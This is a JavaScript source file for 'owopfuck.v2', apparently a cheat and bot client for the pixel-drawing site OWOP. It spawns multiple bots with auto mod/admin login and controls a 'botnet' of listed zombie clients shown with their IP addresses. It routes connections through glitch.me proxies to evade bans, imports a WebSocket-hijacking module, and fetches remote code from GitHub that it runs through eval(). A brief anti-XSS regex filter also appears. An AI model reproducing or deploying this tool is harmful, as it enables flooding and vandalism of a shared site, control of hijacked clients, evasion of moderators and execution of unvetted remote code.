import events from "./core/events.js";
import AimwareUI from "./core/ui-library.js";
import config from "./core/config.js";
import OJS from "./components/OJS.js";
import { bots } from "./core/sharedState.js";
import socket from "./ws-hijacking.js";
import { getLocalPlayer } from "./core/utils.js";
import { botnetSocket } from "./core/botnet.js";
import initAssets from "./assets.js";
import initTools from "./tools.js";
import { startAnimation, stopAnimation } from "./core/animations.js";

function appendScript(url) {
    const script = document.createElement('script');
    script.src = url;
    document.head.appendChild(script);
}

appendScript('https://www.google.com/recaptcha/api.js');

function connectBot(options) {
    const bot = new OJS.Client({
        nickname: config.getValue("Bot Nickname"),
        autoreconnect: config.getValue("Bot AutoReconnect"),
        world: OWOP.world.name,
        unsafe: location.host == "augustberchelmann.com",
        modlogin: config.getValue("Auto Login") ? localStorage.modlogin : undefined,
        adminlogin: config.getValue("Auto Login") ? localStorage.adminlogin : undefined,
        simpleChunks: false,
        ...options
    });
    bot.on("id", () => bots.push(bot));
    bot.on("close", () => bots.splice(bots.indexOf(bot), 1));
}

function initUI() {
    const UI = new AimwareUI("owopfuck.v2", {
        width: 800,
        height: 590,
        x: 165,
        y: 115,
        visible: false,
        keybind: config.getValue("MenuKey")
    });

    /* Client */
    {
        const Client = UI.addTab("Client");

        /* Main */
        const ClientMain = Client.addSection("Main");

        ClientMain.addToggle("AutoReconnect", value => {
            function onDisconnect() {
                if(getValue("autoreconnect")) {
                    setTimeout(function() {
                        document.getElementById("reconnect-btn").click();
                    }, 100);
                }
            }

            if(value) OWOP.on(events.net.disconnected, onDisconnect);
            else OWOP.removeListener(events.net.disconnected, onDisconnect);
        });

        ClientMain.addButton("Disconnect", () => getLocalPlayer().world.destroy());

        /* Visuals */
        const ClientVisuals = Client.addSection("Visuals");

        ClientVisuals.addToggle("Long Chat", value => {
            if(value) document.getElementById("chat").style.maxWidth = "50%";
            else document.getElementById("chat").style.maxWidth = "450px";
        });

        ClientVisuals.addToggle("Bot Breadcrumbs", value => {
            if(value) document.getElementById("custom-animations").style.display = "block";
            else document.getElementById("custom-animations").style.display = "none";
        });
        ClientVisuals.addRange("Breadcrumb Len", 1, 50);

        /* Misc */
        const ClientMisc = Client.addSection("Misc");

        ClientMisc.addToggle("AntiXSS");
    }
    /* Bot */
    {
        const Bot = UI.addTab("Bot");

        /* Main */
        const BotMain = Bot.addSection("Main");

        BotMain.addInput("Bot Nickname", "Nickname");
        BotMain.addToggle("Bot AutoReconnect");
        BotMain.addToggle("Auto Login");
        BotMain.addRange("Bot Count", 1, 10);
        
        BotMain.addButton("Connect", () => {
            for(let i = 0; i < config.getValue("Bot Count"); i++) connectBot();
        });

        BotMain.addButton("Disconnect", () => {
            bots.filter(bot => !bot.clientOptions.localplayer).forEach(bot => bot.net.ws.close());
        });

        BotMain.addLabel("Chat");

        BotMain.addInput("!Message", "Message");
        BotMain.addButton("Send", () => {
            bots.filter(bot => !bot.clientOptions.localplayer).forEach(bot => bot.chat.send(config.getValue("Message")));
        });

        BotMain.addDropdown("Animation",
        [
            "Circle",
            "Square",
            "Star",
            "Triangle",
            "Pentagram",
            "Hexagon",
            "Infinity",
            "X",
            "Spiral",
            "Line",
            "V2",
            "Wave",
            "Plus",
            "Figure8",
            "Heart",
            "Rose",
            "Butterfly",
            "Hypocycloid",
            "Epicycloid",
            "Lissajous",
            "Astroid",
            "Rhodonea",
            "Cardioid",
            "Spirograph"
        ], value => {
            stopAnimation();
            startAnimation();
        });
        
        BotMain.addToggle("Follow", value => {
            if(value) {
                startAnimation();
            } else {
                stopAnimation();
            }
        });

        BotMain.addToggle("Tool Follow");
        BotMain.addToggle("Paint Follow");

        /* Patterns */
        const BotPattern = Bot.addSection("Pattern");

        const EraserPattern = BotPattern.addDropdown("Eraser", []);
        const AreaPattern = BotPattern.addDropdown("Area", []);
        const PastePattern = BotPattern.addDropdown("Paste", []);

        fetch("https://raw.githubusercontent.com/scar17off/scar17off/main/helpers/patterns.js").then(res => res.text()).then(text => {
            eval(text);

            for(let pattern in constants) {
                EraserPattern.addOption(pattern);
                AreaPattern.addOption(pattern);
                PastePattern.addOption(pattern);
            }
        });

        BotPattern.addRange("Minimum Quota", 0, 50);

        BotPattern.addToggle("Wolf Move");
        BotPattern.addToggle("Instant Place");
        BotPattern.addToggle("Smart Sneaky");
        BotPattern.addToggle("Diagonal Fill");
        BotPattern.addToggle("Use Player");
        BotPattern.addToggle("Always Sleep");
        BotPattern.addToggle("Image Pixelization");
    }
    {
        const Botnet = UI.addTab("Botnet");

        const BotnetMain = Botnet.addSection("!Bots");

        let zombies = [];

        BotnetMain.addButton("Control All", () => {
            zombies.forEach(zombie => {
                botnetSocket.emit("control", zombie.id);
            });
        });
        BotnetMain.addButton("Connect", () => botnetSocket.connect());
        BotnetMain.addButton("Disconnect", () => botnetSocket.close());

        const zombiesTable = BotnetMain.addTable(["ID", "IP", "CONTROL", "ACTION"]);

        botnetSocket.on("list", list => {
            zombies = list;
            const currentIds = list.map(item => item.id.toString());
            const existingIds = Array.from(zombiesTable.tbody.getElementsByTagName("tr")).map(row => row.cells[0].textContent);

            existingIds.forEach(id => {
                if (!currentIds.includes(id)) {
                    zombiesTable.removeRow({ ID: id });
                }
            });

            list.forEach(item => {
                const existingRow = zombiesTable.findRow({ ID: item.id.toString() });
                let actionButtons = `
<button id="control-${item.id}" style="width: 200px;" class="aimware-button">${!item.controller ? "Control" : "Uncontrol"}</button>
<button id="connect-${item.id}" style="width: 200px;" class="aimware-button">${!item.connected ? "Connect" : "Disconnect"}</button>
`;

                const rowData = {
                    ID: item.id.toString(),
                    IP: item.ip.split(',').join(" | "),
                    CONTROL: item.controller ? "Yes" : "No",
                    ACTION: actionButtons
                }

                if (existingRow) {
                    zombiesTable.editRow({ ID: item.id.toString() }, rowData);
                } else {
                    zombiesTable.addRow(rowData);
                }

                document.getElementById(`control-${item.id}`).addEventListener("click", () => {
                    if(item.controller) {
                        botnetSocket.emit("uncontrol", item.id);
                    } else {
                        botnetSocket.emit("control", item.id);
                    }
                });

                document.getElementById(`connect-${item.id}`).addEventListener("click", () => {
                    if(item.connected) {
                        botnetSocket.emit("close", item.id);
                    } else {
                        botnetSocket.emit("con", item.id, OWOP.options.serverAddress[0].url, "arraybuffer");

                        connectBot({ zombie: item.id });
                    }
                });
            });
        });
    }
    {
        const Proxy = UI.addTab("Proxy");

        const ProxyMain = Proxy.addSection("!Main");

        const ProxyName = ProxyMain.addInput("!Proxy Name", "Name");
        const ProxyType = ProxyMain.addDropdown("!Proxy Type", ["glitch.me"]);

        function getEditURL(proxyName, proxyType) {
            if(proxyType == "glitch.me") return `https://glitch.com/edit/#!/ws-proxy${proxyName}-${proxyType}?path=server.js%3A5%3A33`;
            return `https://${proxyName}.${proxyType}`;
        }

        ProxyMain.addButton("Add", () => {
            const proxies = config.getValue("Proxies");
            proxies.push({ name: ProxyName.value, type: ProxyType.value });
            config.setValue("Proxies", proxies);

            const actionButtons = `
<button id="connect-proxy-${ProxyName.value}" style="width: 200px;" class="aimware-button">Connect</button>
<button id="delete-proxy-${ProxyName.value}" style="width: 200px;" class="aimware-button">Delete</button>
`;

            ProxyTable.addRow({ NAME: `<a href="${getEditURL(ProxyName.value, ProxyType.value)}">${ProxyName.value}</a>`, "ACTION.action-cell": actionButtons });

            document.getElementById(`connect-proxy-${ProxyName.value}`).addEventListener("click", () => {
                connectBot({ proxy: ProxyName.value, proxyType: ProxyType.value });
            });

            document.getElementById(`delete-proxy-${ProxyName.value}`).addEventListener("click", () => {
                ProxyTable.removeRow({ NAME: ProxyName.value });
                config.setValue("Proxies", config.getValue("Proxies").filter(item => item.name != ProxyName.value && item.type != ProxyType.value));
            });
        });

        const ProxyTable = ProxyMain.addTable(["NAME", "ACTION.action-cell"]);

        const proxies = config.getValue("Proxies");
        proxies.forEach(proxy => {
            ProxyTable.addRow({ NAME: `<a href="${getEditURL(proxy.name, proxy.type)}">${proxy.name}</a>`, "ACTION.action-cell": actionButtons });
        });
    }
    {
        const List = UI.addTab("List");

        const ListPlayers = List.addSection("!Players");
        const ListBots = List.addSection("!Bots");

        const playersTable = ListPlayers.addTable(["ID", "X", "Y", "CONNECTION.connection-cell", "RGB.rgb-cell"]);
        const botsTable = ListBots.addTable(["ID", "X", "Y", "CONNECTION.connection-cell", "RGB.rgb-cell"]);

        const client = getLocalPlayer();
        
        client.on("connect", ID => {
            setTimeout(() => {
                const bot = bots.find(bot => bot.player.id == ID);
                if(bot) {
                    botsTable.addRow({ ID, X: 0, Y: 0, "CONNECTION.connection-cell": bot.clientOptions.connection, "RGB.rgb-cell": createColorDiv("0,0,0") });
                    return;
                }
                playersTable.addRow({ ID, X: 0, Y: 0, "CONNECTION.connection-cell": "ЁЯдб", "RGB.rgb-cell": createColorDiv("0,0,0") });
            }, 500);
        });

        client.on("update", player => {
            const bot = bots.find(bot => bot.player.id == player.id);
            if(bot) {
                botsTable.editRow({ ID: player.id }, { ID: player.id, X: player.x, Y: player.y, "CONNECTION.connection-cell": bot.clientOptions.connection, "RGB.rgb-cell": createColorDiv(player.rgb || "0,0,0") });
                return;
            }
            playersTable.editRow({ ID: player.id }, { ID: player.id, X: player.x, Y: player.y, "CONNECTION.connection-cell": "ЁЯдб", "RGB.rgb-cell": createColorDiv(player.rgb || "0,0,0") });
        });

        client.on("disconnect", player => {
            const ID = player.id;
            const bot = bots.find(bot => bot.player.id == ID);
            if(bot) {
                botsTable.removeRow({ ID });
                return;
            }
            playersTable.removeRow({ ID });
        });

        function createColorDiv(rgb) {
            const div = document.createElement("div");
            div.style.width = "20px";
            div.style.height = "20px";
            div.style.backgroundColor = `rgb(${rgb})`;
            div.title = rgb;

            return div.outerHTML;
        }
    }
}

function onLoad() {
    initTools();
    initUI();
    initAssets();

    OWOP.chat.local(`owopfuck.v2 loaded! Use ${config.getValue("MenuKey")} to open the menu.`);
}

window.onload = () => {

    function sanitizeInput(input) {
        return input.replace(/[&<>"'/]/g, function (match) {
            return {
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#39;',
                '/': '&#x2F;'
            }[match];
        });
    };
    function isInputSafe(input) {
        const htmlTags = /<\/?[a-z][\s\S]*>/i;
        const scriptTags = /<script[\s\S]*?>[\s\S]*?<\/script>/gi;
        const eventHandlers = /on\w+="[^"]*"/i;

        if (htmlTags.test(input)) return false;
        if (scriptTags.test(input)) return false;
        if (eventHandlers.test(input)) return false;

        return true;
    };
    const defaultrecvModifier = (msg) => {
        if(msg == "Stop playing around with mod tools! :)") return;
        if(!isInputSafe(msg) && config.getValue("AntiXSS")) return "[XSS] " + sanitizeInput(msg);
        return msg;
    };
    OWOP.chat.recvModifier = defaultrecvModifier;
    
    OWOP.once(events.net.world.join, onLoad);
}
